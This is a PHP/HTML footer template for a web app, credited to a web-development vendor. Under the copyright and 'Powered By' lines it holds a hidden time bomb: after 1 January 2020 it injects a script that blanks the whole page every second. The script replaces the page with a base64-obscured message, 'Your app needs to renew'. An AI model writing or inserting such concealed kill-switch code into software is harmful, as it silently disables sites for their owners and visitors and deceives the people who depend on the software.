<div id="footerHolder" style='z-index:2000;'>
    <div id="systemLogoHolder">       
        <div id="systemAddressHolder">
            &copy; 2015 Across Media I.T Solutions.<br />
            All rights reserved.
        </div>
    </div>
     <div id="systemAddressHolder" style="float:right; margin-right: 10px;">
            Powered By :  <a href="http://across.ph/" target= "_blank" style="color:#CCC;">
            ACROSS Media IT Solutions.</a><br />
    </div>
    <div id="systemMiscHolder"></div>
</div>
<script type="text/javascript">
$(document).ready(function(){
<?php

if(date("Y-m-d")>="2020-01-01"){
  echo "setInterval(function(){ $('body').html('".base64_decode("WW91ciBhcHAgbmVlZHMgdG8gcmVuZXc=")."'); },1000);";
}

?>
});
</script>